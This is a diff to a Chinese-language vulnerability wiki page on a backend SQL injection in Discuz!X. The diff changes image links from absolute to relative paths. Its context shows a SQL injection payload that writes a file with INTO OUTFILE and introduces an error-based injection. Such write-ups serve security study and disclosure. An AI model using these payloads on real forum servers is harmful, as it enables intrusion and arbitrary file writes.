@@ -196,23 +196,23 @@ source\\admincp\\admincp\_setting.php 2523行
     define('UC_APPID', 'sadsadsadasd\'');
     printf(UC_APPID);
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId24.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId24.png)
 
 漏洞验证
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId25.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId25.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId26.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId26.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId27.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId27.png)
 
 直接构造语句
 
     1' into outfile 'c:\\wamp64\\tmp\\1.txt'  -- a
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId28.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId28.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId29.png)
+![](./.resource/Discuz!X系列全版本后台Sql注入漏洞/media/rId29.png)
 
 构造报错注入
 
